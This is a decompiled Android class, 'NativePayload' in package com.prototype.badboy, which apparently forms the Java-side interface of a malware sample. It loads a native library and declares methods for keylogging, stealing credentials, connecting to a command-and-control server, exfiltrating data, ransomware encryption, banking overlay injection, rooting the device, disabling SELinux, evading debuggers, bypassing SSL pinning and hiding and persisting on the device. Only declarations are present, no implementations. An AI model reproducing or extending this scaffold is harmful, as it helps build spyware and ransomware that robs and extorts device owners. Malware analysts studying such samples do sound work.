package com.prototype.badboy;

import kotlin.Metadata;

/* loaded from: classes3.dex */
@Metadata(d1 = "\u0000(\n\u0002\u0018\u0002\n\u0002\u0010\u0000\n\u0002\u0008\u0003\n\u0002\u0010\u000e\n\u0000\n\u0002\u0010\u0012\n\u0000\n\u0002\u0010\u0008\n\u0002\u0008\u0004\n\u0002\u0010\u0002\n\u0002\u0008\u0016\u0008Ç\u0002\u0018\u00002\u00020\u0001B\t\u0008\u0002¢\u0006\u0004\u0008\u0002\u0010\u0003J\u0011\u0010\u0004\u001a\u00020\u00052\u0006\u0010\u0006\u001a\u00020\u0007H\u0086 J\u0011\u0010\u0008\u001a\u00020\t2\u0006\u0010\n\u001a\u00020\u0005H\u0086 J\u0011\u0010\u000b\u001a\u00020\t2\u0006\u0010\u000c\u001a\u00020\tH\u0086 J\t\u0010\r\u001a\u00020\u000eH\u0086 J\u000b\u0010\u000f\u001a\u0004\u0018\u00010\u0007H\u0086 J\t\u0010\u0010\u001a\u00020\u000eH\u0086 J\t\u0010\u0011\u001a\u00020\u0005H\u0086 J\t\u0010\u0012\u001a\u00020\u000eH\u0086 J\t\u0010\u0013\u001a\u00020\tH\u0086 J\t\u0010\u0014\u001a\u00020\u000eH\u0086 J\t\u0010\u0015\u001a\u00020\u000eH\u0086 J\u0011\u0010\u0016\u001a\u00020\u00052\u0006\u0010\u0017\u001a\u00020\u0005H\u0086 J\u0011\u0010\u0018\u001a\u00020\u000e2\u0006\u0010\u0019\u001a\u00020\u0007H\u0086 J\u0011\u0010\u001a\u001a\u00020\t2\u0006\u0010\u001b\u001a\u00020\u0007H\u0086 J\u0011\u0010\u001c\u001a\u00020\u000e2\u0006\u0010\u001d\u001a\u00020\u0005H\u0086 J\t\u0010\u001e\u001a\u00020\u000eH\u0086 J\t\u0010\u001f\u001a\u00020\u000eH\u0086 J\t\u0010 \u001a\u00020\u0005H\u0086 J\u0011\u0010!\u001a\u00020\u000e2\u0006\u0010\"\u001a\u00020\u0005H\u0086 J\t\u0010#\u001a\u00020\tH\u0086 ¨\u0006$", d2 = {"Lcom/prototype/badboy/NativePayload;", "", "<init>", "()V", "decryptPayload", "", "encrypted", "", "executeShellCommand", "", "cmd", "injectProcess", "pid", "hideFromProcessList", "", "stealCredentials", "keyloggerStart", "keyloggerGetBuffer", "screenCapture", "rootDevice", "antiDebug", "bypassSSLPinning", "connectC2Server", "url", "exfiltrateData", "data", "loadDexFromMemory", "dex", "hookSystemCall", "syscall", "disableSelinux", "persistPayload", "getDeviceFingerprint", "ransomwareEncrypt", "path", "bankingOverlayInject", "app_debug"}, k = 1, mv = {2, 0, 0}, xi = 48)
public final class NativePayload {

    public static final int $stable;
    public static final com.prototype.badboy.NativePayload INSTANCE;
    static {
        String str;
        NativePayload nativePayload = new NativePayload();
        NativePayload.INSTANCE = nativePayload;
        System.loadLibrary("badboy_native");
    }

    public final native void antiDebug();

    public final native int bankingOverlayInject();

    public final native void bypassSSLPinning();

    public final native String connectC2Server(String string);

    public final native String decryptPayload(byte[] bArr);

    public final native void disableSelinux();

    public final native int executeShellCommand(String string);

    public final native void exfiltrateData(byte[] bArr);

    public final native String getDeviceFingerprint();

    public final native void hideFromProcessList();

    public final native void hookSystemCall(String string);

    public final native int injectProcess(int i);

    public final native String keyloggerGetBuffer();

    public final native void keyloggerStart();

    public final native int loadDexFromMemory(byte[] bArr);

    public final native void persistPayload();

    public final native void ransomwareEncrypt(String string);

    public final native int rootDevice();

    public final native void screenCapture();

    public final native byte[] stealCredentials();
}
